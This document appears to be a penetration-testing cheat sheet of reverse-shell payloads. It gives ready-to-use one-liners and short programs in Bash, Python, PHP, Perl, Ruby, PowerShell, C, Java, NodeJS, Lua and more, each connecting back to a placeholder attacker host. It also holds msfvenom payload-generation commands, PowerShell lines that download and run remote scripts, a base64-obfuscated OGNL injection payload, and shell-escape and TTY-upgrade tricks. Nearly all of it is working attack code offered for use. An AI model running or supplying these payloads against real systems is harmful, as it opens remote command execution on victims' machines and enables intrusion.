# REVERSE SHELLS

## Website - RevShellBuilder

https://www.revshells.com/

## Bash

### TCP /dev/tcp

```bash
bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
```

### TCP via exec + file descriptor

```bash
0<&196;exec 196<>/dev/tcp/<LHOST>/<LPORT>; sh <&196 >&196 2>&196
```

### Login shell redirection

```bash
/bin/bash -l > /dev/tcp/<LHOST>/<LPORT> 0<&1 2>&1
```

### UDP

```bash
# Victim
sh -i >& /dev/udp/<LHOST>/<LPORT> 0>&1

# Listener
nc -u -lvp <LPORT>
```

## Socat

### TTY socat

```bash
# Attacker
socat file:`tty`,raw,echo=0 TCP-L:<LPORT>

# Victim
/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LHOST>:<LPORT>
```

### Static binary download + TTY socat

```bash
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LHOST>:<LPORT>
```

## Perl

### Socket module

```perl
perl -e 'use Socket;$i="<LHOST>";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### IO::Socket fork

```perl
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<LHOST>:<LPORT>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

### IO::Socket (Windows only)

```perl
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"<LHOST>:<LPORT>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

## Python

### Linux only - IPv4, pty spawn via env vars

```python
export RHOST="<LHOST>";export RPORT=<LPORT>;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

### Linux only - IPv4, pty spawn

```python
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

### Linux only - IPv4, subprocess.call with dup2

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### Linux only - IPv4, subprocess.call stdio kwargs

```python
python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
```

### IPv4 (no spaces), pty spawn

```python
python -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

### IPv4 (no spaces), subprocess.call with dup2

```python
python -c 'socket=__import__("socket");subprocess=__import__("subprocess");os=__import__("os");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### IPv4 (no spaces), subprocess.call stdio kwargs

```python
python -c 'socket=__import__("socket");subprocess=__import__("subprocess");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
```

### IPv4 (no spaces, shortened), pty spawn

```python
python -c 'a=__import__;s=a("socket");o=a("os").dup2;p=a("pty").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect(("<LHOST>",<LPORT>));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
```

### IPv4 (no spaces, shortened), subprocess.call with dup2

```python
python -c 'a=__import__;b=a("socket");p=a("subprocess").call;o=a("os").dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(["/bin/sh","-i"])'
```

### IPv4 (no spaces, shortened), subprocess.call stdio kwargs

```python
python -c 'a=__import__;b=a("socket");c=a("subprocess").call;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));f=s.fileno;c(["/bin/sh","-i"],stdin=f(),stdout=f(),stderr=f())'
```

### IPv4 (no spaces, shortened further), pty spawn

```python
python -c 'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("<LHOST>",<LPORT>));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
```

### IPv4 (no spaces, shortened further), subprocess.call with dup2

```python
python -c 'a=__import__;b=a("socket").socket;p=a("subprocess").call;o=a("os").dup2;s=b();s.connect(("<LHOST>",<LPORT>));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(["/bin/sh","-i"])'
```

### IPv4 (no spaces, shortened further), subprocess.call stdio kwargs

```python
python -c 'a=__import__;b=a("socket").socket;c=a("subprocess").call;s=b();s.connect(("<LHOST>",<LPORT>));f=s.fileno;c(["/bin/sh","-i"],stdin=f(),stdout=f(),stderr=f())'
```

### IPv6, pty spawn

```python
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",<LPORT>,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

### IPv6 (no spaces), pty spawn

```python
python -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",<LPORT>,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

### IPv6 (no spaces, shortened), pty spawn

```python
python -c 'a=__import__;c=a("socket");o=a("os").dup2;p=a("pty").spawn;s=c.socket(c.AF_INET6,c.SOCK_STREAM);s.connect(("dead:beef:2::125c",<LPORT>,0,2));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
```

### Windows only (Python 2), threaded cmd.exe relay

```python
python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('<LHOST>', <LPORT>)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```

### Windows only (Python 3), threaded cmd.exe relay

```python
python.exe -c "import socket,os,threading,subprocess as sp;p=sp.Popen(['cmd.exe'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect(('<LHOST>',<LPORT>));threading.Thread(target=exec,args=(\"while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)\",globals()),daemon=True).start();threading.Thread(target=exec,args=(\"while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)\",globals())).start()"
```

## PHP

### fsockopen + exec

```php
php -r '$sock=fsockopen("<LHOST>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### fsockopen + shell_exec

```php
php -r '$sock=fsockopen("<LHOST>",<LPORT>);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
```

### fsockopen + backticks

```php
php -r '$sock=fsockopen("<LHOST>",<LPORT>);`/bin/sh -i <&3 >&3 2>&3`;'
```

### fsockopen + system

```php
php -r '$sock=fsockopen("<LHOST>",<LPORT>);system("/bin/sh -i <&3 >&3 2>&3");'
```

### fsockopen + passthru

```php
php -r '$sock=fsockopen("<LHOST>",<LPORT>);passthru("/bin/sh -i <&3 >&3 2>&3");'
```

### fsockopen + popen

```php
php -r '$sock=fsockopen("<LHOST>",<LPORT>);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
```

### fsockopen + proc_open

```php
php -r '$sock=fsockopen("<LHOST>",<LPORT>);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

## Ruby

### TCPSocket + exec via fd

```ruby
ruby -rsocket -e'f=TCPSocket.open("<LHOST>",<LPORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### TCPSocket fork + command loop

```ruby
ruby -rsocket -e'exit if fork;c=TCPSocket.new("<LHOST>","<LPORT>");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'
```

### TCPSocket command loop (Windows only)

```ruby
ruby -rsocket -e 'c=TCPSocket.new("<LHOST>","<LPORT>");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

## Rust

### TcpStream + raw fd Command spawn

```rust
use std::net::TcpStream;
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio};

fn main() {
    let s = TcpStream::connect("<LHOST>:<LPORT>").unwrap();
    let fd = s.as_raw_fd();
    Command::new("/bin/sh")
        .arg("-i")
        .stdin(unsafe { Stdio::from_raw_fd(fd) })
        .stdout(unsafe { Stdio::from_raw_fd(fd) })
        .stderr(unsafe { Stdio::from_raw_fd(fd) })
        .spawn()
        .unwrap()
        .wait()
        .unwrap();
}
```

## Golang

### net.Dial one-liner via go run

```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","<LHOST>:<LPORT>");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```

## Netcat Traditional

### -e exec flag

```bash
nc -e /bin/sh <LHOST> <LPORT>
nc -e /bin/bash <LHOST> <LPORT>
nc -c bash <LHOST> <LPORT>
```

## Netcat OpenBSD

### mkfifo relay (no -e support)

```bash
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f
```

## Netcat BusyBox

### mknod relay

```bash
rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f
```

## Ncat

### -e exec flag (TCP and UDP)

```bash
ncat <LHOST> <LPORT> -e /bin/bash
ncat --udp <LHOST> <LPORT> -e /bin/bash
```

## OpenSSL

### TLS listener + mkfifo relay

```bash
# Attacker: generate a self-signed cert and start a TLS listener
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port <LPORT>
# or
ncat --ssl -vv -l -p <LPORT>

# Victim
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <LHOST>:<LPORT> > /tmp/s; rm /tmp/s
```

### TLS-PSK relay (no PKI/self-signed cert needed)

```bash
# generate 384-bit PSK
# use the generated string as a value for the two PSK variables from below
openssl rand -hex 48

# server (attacker)
export LHOST="*"; export LPORT="<LPORT>"; export PSK="replacewithgeneratedpskfromabove"; openssl s_server -quiet -tls1_2 -cipher PSK-CHACHA20-POLY1305:PSK-AES256-GCM-SHA384:PSK-AES256-CBC-SHA384:PSK-AES128-GCM-SHA256:PSK-AES128-CBC-SHA256 -psk $PSK -nocert -accept $LHOST:$LPORT

# client (victim)
export RHOST="<LHOST>"; export RPORT="<LPORT>"; export PSK="replacewithgeneratedpskfromabove"; export PIPE="/tmp/`openssl rand -hex 4`"; mkfifo $PIPE; /bin/sh -i < $PIPE 2>&1 | openssl s_client -quiet -tls1_2 -psk $PSK -connect $RHOST:$RPORT > $PIPE; rm $PIPE
```

## Powershell

### TCPClient interactive loop (hidden window)

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### TCPClient interactive loop (-c inline)

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Download and run remote mini-reverse.ps1

```powershell
powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')
```

## Awk

### /inet/tcp special file loop

```awk
awk 'BEGIN {s = "/inet/tcp/0/<LHOST>/<LPORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

## Java

### Runtime.exec bash /dev/tcp

```java
Runtime r = Runtime.getRuntime();
Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/<LHOST>/<LPORT>;cat <&5 | while read line; do $line 2>&5 >&5; done'");
p.waitFor();
```

### ProcessBuilder + Socket stream pump

```java
String host="<LHOST>";
int port=<LPORT>;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

### Thread-based skeleton

```java
Thread thread = new Thread(){
    public void run(){
        // Reverse shell here
    }
}
thread.start();
```

## Telnet

### Dual-listener FIFO-less relay

```bash
# Attacker: start two listeners
nc -lvp 8080
nc -lvp 8081

# Victim
telnet <LHOST> 8080 | /bin/sh | telnet <LHOST> 8081
```

## War

### msfvenom JSP reverse shell WAR

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war > reverse.war
strings reverse.war | grep jsp # in order to get the name of the file
```

## Lua

### Linux only

```lua
lua -e "require('socket');require('os');t=socket.tcp();t:connect('<LHOST>','<LPORT>');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

### Windows and Linux

```lua
lua5.1 -e 'local host, port = "<LHOST>", <LPORT> local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```

## NodeJS

### net + child_process pipe

```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(<LPORT>, "<LHOST>", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
```

### child_process.exec with nc

```javascript
require('child_process').exec('nc -e /bin/sh <LHOST> <LPORT>')
```

### child_process.exec via mainModule.require

```javascript
var x = global.process.mainModule.require
x('child_process').exec('nc <LHOST> <LPORT> -e /bin/bash')
```

## OGNL

### base64-decoded bash payload via ProcessBuilder

```
(#a='echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80MjQyIDA+JjEnCg== | base64 -d | bash -i').(#b={'bash','-c',#a}).(#p=new java.lang.ProcessBuilder(#b)).(#process=#p.start())
```

## Groovy

### ProcessBuilder + Socket stream pump

```groovy
String host="<LHOST>";
int port=<LPORT>;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

### Thread-based skeleton

```groovy
Thread.start {
    // Reverse shell here
}
```

## C

### socket + dup2 + execve

```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = <LPORT>;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("<LHOST>");

    connect(sockt, (struct sockaddr *) &revsockaddr,
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);

    return 0;
}
```

## Dart

### Socket.connect + powershell.exe pipe

```dart
import 'dart:io';
import 'dart:convert';

main() {
  Socket.connect("<LHOST>", <LPORT>).then((socket) {
    socket.listen((data) {
      Process.start('powershell.exe', []).then((Process process) {
        process.stdin.writeln(new String.fromCharCodes(data).trim());
        process.stdout
          .transform(utf8.decoder)
          .listen((output) { socket.write(output); });
      });
    },
    onDone: () {
      socket.destroy();
    });
  });
}
```

## Meterpreter Shell

### Windows staged reverse TCP

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe > reverse.exe
```

### Windows stageless reverse TCP

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe > reverse.exe
```

### Linux staged reverse TCP

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf >reverse.elf
```

### Linux stageless reverse TCP

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf >reverse.elf
```

### Other platforms (macOS, ASP, JSP, WAR, script payloads)

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="<LHOST>" LPORT=<LPORT> -f elf > shell.elf
msfvenom -p windows/meterpreter/reverse_tcp LHOST="<LHOST>" LPORT=<LPORT> -f exe > shell.exe
msfvenom -p osx/x86/shell_reverse_tcp LHOST="<LHOST>" LPORT=<LPORT> -f macho > shell.macho
msfvenom -p windows/meterpreter/reverse_tcp LHOST="<LHOST>" LPORT=<LPORT> -f asp > shell.asp
msfvenom -p java/jsp_shell_reverse_tcp LHOST="<LHOST>" LPORT=<LPORT> -f raw > shell.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST="<LHOST>" LPORT=<LPORT> -f war > shell.war
msfvenom -p cmd/unix/reverse_python LHOST="<LHOST>" LPORT=<LPORT> -f raw > shell.py
msfvenom -p cmd/unix/reverse_bash LHOST="<LHOST>" LPORT=<LPORT> -f raw > shell.sh
msfvenom -p cmd/unix/reverse_perl LHOST="<LHOST>" LPORT=<LPORT> -f raw > shell.pl
msfvenom -p php/meterpreter_reverse_tcp LHOST="<LHOST>" LPORT=<LPORT> -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```

## Spawn TTY Shell

### rlwrap netcat wrapper

```bash
rlwrap nc <LHOST> <LPORT>
```

### rlwrap with history-file completion

```bash
# -f . will make rlwrap use the current history file as a completion word list.
# -r Put all words seen on in- and output on the completion list.
rlwrap -r -f . nc <LHOST> <LPORT>
```

### Background job + stty full TTY upgrade

```bash
ctrl+z
echo $TERM && tput lines && tput cols

# for bash
stty raw -echo
fg

# for zsh
stty raw -echo; fg

reset
export SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <cols>
```

### tmux detach/reattach TTY upgrade

```bash
# Enter in tmux
tmux

# Do your netcat stuff ...
nc -lnvp <LPORT>

# Create a new window in tmux
ctrl+b c

# Find the PID of the nc process (column PID)
ps aux # | grep -i nc | grep -vi grep

# Send a SIGTSTP (ctrl+z) signal to the process
kill -s TSTP <PID>
```

### socat TTY listener upgrade

```bash
socat file:`tty`,raw,echo=0 tcp-listen:12345
```

### stty + rcat script wrapper

```bash
stty raw -echo; stty size && rcat l -ie "/usr/bin/script -qc /bin/bash /dev/null" 6969 && reset
```

### Minimal pty spawns (sh/python/perl/ruby/lua one-liners)

```bash
/bin/sh -i
python3 -c 'import pty; pty.spawn("/bin/sh")'
python3 -c "__import__('pty').spawn('/bin/bash')"
python3 -c "__import__('subprocess').call(['/bin/bash'])"
perl -e 'exec "/bin/sh";'
perl: exec "/bin/sh";
perl -e 'print `/bin/bash`'
ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')
```

### Vi/nmap/mysql escape-to-shell methods

```bash
vi: :!bash
vi: :set shell=/bin/bash:shell
nmap: !sh
mysql: ! bash
```

### script(1) alternative TTY method

```bash
www-data@debian:/dev/shm$ su - user
su: must be run from a terminal

www-data@debian:/dev/shm$ /usr/bin/script -qc /bin/bash /dev/null
www-data@debian:/dev/shm$ su - user
Password: P4ssW0rD

user@debian:~$
```

## Fully Interactive Reverse Shell On Windows

### stty raw + ConPtyShell

```bash
# Server Side
stty raw -echo; (stty size; cat) | nc -lvnp <LPORT>

# Client Side
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell <LHOST> <LPORT>
```
